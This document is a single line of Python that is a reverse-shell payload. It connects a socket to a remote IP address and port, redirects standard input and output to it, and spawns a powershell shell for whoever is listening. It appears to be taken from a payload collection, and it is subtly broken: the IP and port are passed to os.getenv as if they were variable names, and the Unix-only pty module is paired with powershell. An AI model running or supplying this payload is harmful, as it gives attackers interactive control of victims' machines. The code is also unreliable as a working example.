import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("78.107.250.140"),int(os.getenv("24464"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("powershell")
